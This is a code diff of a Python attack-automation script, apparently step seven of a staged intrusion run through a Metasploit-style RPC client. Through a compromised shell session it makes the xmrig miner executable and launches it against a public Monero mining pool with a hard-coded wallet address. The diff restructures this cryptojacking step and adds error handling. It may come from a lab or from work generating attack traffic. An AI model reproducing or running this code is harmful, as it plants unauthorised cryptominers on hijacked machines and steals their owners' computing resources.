@@ -11,9 +11,6 @@ def record_timestamp(folder, output_time_file):
 
 
 def main(argv):
-    if len(argv) != 4:
-        print("Usage: {} Folder local_ip target_ip".format(argv[0]))
-
     folder = argv[1]
     my_ip = argv[2]
     target_ip = argv[3]
@@ -24,19 +21,22 @@ def main(argv):
     output_time_file_start = 'time_step_7_start.txt'
     record_timestamp(folder, output_time_file_start)
     time.sleep(2)
+    
+    try:
+        while client.jobs.list:
+            time.sleep(1)
 
-    while client.jobs.list:
-        time.sleep(1)
+        shell = client.sessions.session('3')
+        shell.write('chmod +x ./xmrig')
+        shell.write('timeout 60s ./xmrig --donate-level 4 -o pool.minexmr.com:443 -u '
+                    '44Hp1de8CprPz2K74U5ch4VssxZQUDjVrZWtgRScHZo83mb6D6cHfpLZg4zhaT1BvzJe5jdbPLHzqHp4jrx1hP6UHFCgWhN '
+                    '-k --tls')
+    
+    except Exception as e:
+        print(e)
+        pass
 
-    shell = client.sessions.session('3')
-    shell.write('chmod +x ./xmrig')
-    shell.write('timeout 60s ./xmrig --donate-level 4 -o pool.minexmr.com:443 -u '
-                '44Hp1de8CprPz2K74U5ch4VssxZQUDjVrZWtgRScHZo83mb6D6cHfpLZg4zhaT1BvzJe5jdbPLHzqHp4jrx1hP6UHFCgWhN '
-                '-k --tls')
-
-    while client.jobs.list:
-        time.sleep(1)
-    time.sleep(10)
+    time.sleep(60)
 
 
 main(sys.argv)
